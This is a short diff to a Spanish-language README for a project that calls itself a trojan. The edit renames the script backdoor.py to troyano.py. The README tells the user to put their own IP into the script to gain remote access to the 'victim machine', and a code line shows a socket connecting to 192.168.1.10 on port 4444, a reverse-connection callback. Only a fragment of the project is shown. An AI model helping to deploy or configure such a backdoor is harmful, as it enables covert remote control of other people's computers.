@@ -8,7 +8,7 @@ Un troyano es un tipo de software malicioso que se disfraza de una aplicación l
 
 ### Instalación
 
-Descargar el repositorio de Github luego configurar el script **backdoor.py** con tu IP para poder tener acceso remoto a la maquina victima
+Descargar el repositorio de Github luego configurar el script **troyano.py** con tu IP para poder tener acceso remoto a la maquina victima
 
 ```python
 conexion.connect(("192.168.1.10", 4444))
